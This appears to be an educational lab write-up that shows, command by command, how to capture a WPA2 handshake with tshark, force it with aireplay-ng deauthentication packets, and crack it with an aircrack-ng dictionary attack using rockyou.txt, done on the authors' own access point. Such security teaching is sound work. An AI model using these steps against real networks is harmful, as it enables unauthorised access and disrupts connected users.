## Capturing the 4-Way Handshake on Linux Using tshark

To perform a practical demonstration of WiFi security weaknesses, the first step was to capture a WPA2 4-way handshake. This requires a Linux machine (e.g., Kali Linux or Ubuntu) with a wireless network interface card (NIC) that supports **monitor mode**. Below are the exact steps we followed.

### 1. Verify Wireless Interface and Monitor Mode Support
```bash
# Identify your wireless interface (usually wlan0)
iw dev
# or
iwconfig

# Check supported modes (look for "monitor")
iw list | grep -A 10 "Supported interface modes"
```
- If `monitor` is **not** listed, you will need a compatible USB WiFi adapter (e.g., one based on Atheros AR9271 or Ralink RT3070 chipsets). Built-in laptop cards often do not support it.

### 2. Put the Interface into Monitor Mode
We used the `aircrack-ng` suite (recommended for reliability):
```bash
sudo apt update && sudo apt install aircrack-ng tshark -y

sudo airmon-ng check kill          # Kill interfering processes (NetworkManager, etc.)
sudo airmon-ng start wlan0         # Creates mon0 (or wlan0mon)
```
Manual alternative (if airmon-ng is unavailable):
```bash
sudo ip link set wlan0 down
sudo iw wlan0 set monitor none
sudo ip link set wlan0 up
```

### 3. Set the Correct Channel
The interface **must** be locked to the target AP's channel (critical for capturing the handshake):
```bash
# Example: AP is on channel 11
sudo iw dev mon0 set channel 11
```
(You can discover the channel beforehand with `sudo airodump-ng mon0` or `iwlist wlan0 scan` before enabling monitor mode.)

### 4. Listen and Record the 4-Way Handshake with tshark
```bash
# Targeted capture: EAPOL (4-way handshake) + traffic to/from the AP BSSID
sudo tshark -i mon0 -w pcap.pcap -f "wlan addr 9C:A2:F4:28:E8:AB or eapol"
```
- **To force the handshake** (most networks are idle): Open a second terminal and deauthenticate a connected client:
  ```bash
  sudo aireplay-ng -0 10 -a 9C:A2:F4:28:E8:AB mon0   # Send 10 deauth packets
  ```
- Watch the tshark terminal (or stop with Ctrl+C once you see the 4 EAPOL messages in a follow-up Wireshark analysis). The file `pcap.pcap` now contains the handshake.

## Cracking the Handshake with Aircrack-ng (Dictionary Attack)

Once the handshake was captured, we cracked it using a dictionary attack. The exact command we ran was:

```bash
aircrack-ng -a 2 -b 9C:A2:F4:28:E8:AB -w real_password.txt pcap.pcap
```

**Command breakdown:**
- `-a 2` → WPA/WPA2-PSK attack mode
- `-b 9C:A2:F4:28:E8:AB` → Target AP BSSID
- `-w real_password.txt` → Wordlist file

We created `real_password.txt` as a small curated list but also demonstrated the attack using the classic `rockyou.txt` wordlist (14+ million common passwords). Because the password we set on our test access point was a **common word** that appears in rockyou.txt, aircrack-ng quickly found the match and output the cracked key.

**Demo result:**  
The attack completed in seconds on our lab hardware, proving that weak/common passwords make WPA2-PSK networks trivially crackable once the handshake is captured. This was a controlled educational demonstration on our own AP only.